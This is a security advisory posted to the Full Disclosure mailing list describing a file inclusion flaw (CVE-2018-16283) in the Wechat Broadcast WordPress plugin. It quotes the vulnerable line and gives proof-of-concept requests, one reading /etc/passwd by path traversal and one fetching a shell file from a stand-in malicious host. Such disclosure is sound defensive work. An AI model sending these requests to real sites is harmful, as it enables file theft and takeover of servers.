
Date: Wed, 19 Sep 2018 09:12:02 +0200
From: Manuel Garcia Cardenas <advidsec@...il.com>
To: fulldisclosure@...lists.org, dm@...urityfocus.com, submit@...sec.com
Subject: [FD] WordPress Plugin Wechat Broadcast 1.2.0 - Local/Remote File
	Inclusion

=============================================
MGC ALERT 2018-005
- Original release date: August 31, 2018
- Last revised:  September 19, 2018
- Discovered by: Manuel García Cárdenas
- Severity: 9/10 (CVSS Base Score)
- CVE-ID: CVE-2018-16283
=============================================

I. VULNERABILITY
-------------------------
WordPress Plugin Wechat Broadcast 1.2.0 - Local/Remote File Inclusion

II. BACKGROUND
-------------------------
Wechat Broadcast allow push to the WeChat public account subscriber

III. DESCRIPTION
-------------------------
This bug was found in the file:

/wechat-broadcast/wechat/Image.php

echo file_get_contents(isset($_GET["url"]) ? $_GET["url"] : '');

The parameter "url" it is not sanitized allowing include local or remote
files

To exploit the vulnerability only is needed use the version 1.0 of the HTTP
protocol to interact with the application.

IV. PROOF OF CONCEPT
-------------------------
The following URL have been confirmed that is vulnerable to local and
remote file inclusion.

Local File Inclusion POC:

GET
/wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd

Remote File Inclusion POC:

GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=
http://malicious.url/shell.txt

V. BUSINESS IMPACT
-------------------------
Public defacement, confidential data leakage, and database server
compromise can result from these attacks. Client systems can also be
targeted, and complete compromise of these client systems is also possible.

VI. SYSTEMS AFFECTED
-------------------------
Wechat Broadcast <= 1.2.0

VII. SOLUTION
-------------------------
Disable plugin until a fix is available.
https://github.com/springjk/wordpress-wechat-broadcast/issues/14

VIII. REFERENCES
-------------------------
https://es.wordpress.org/plugins/wechat-broadcast/

IX. CREDITS
-------------------------
This vulnerability has been discovered and reported
by Manuel García Cárdenas (advidsec (at) gmail (dot) com).

X. REVISION HISTORY
-------------------------
August 31, 2018 1: Initial release
September 19, 2018 2: Revision to send to lists

XI. DISCLOSURE TIMELINE
-------------------------
August 31, 2018 1: Vulnerability acquired by Manuel Garcia Cardenas
August 31, 2018 2: Email to vendor without response
September 10, 2018 3: Second email to vendor without response
September 19, 2018 4: Send to the Full-Disclosure lists

XII. LEGAL NOTICES
-------------------------
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.

XIII. ABOUT
-------------------------
Manuel Garcia Cardenas
Pentester

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/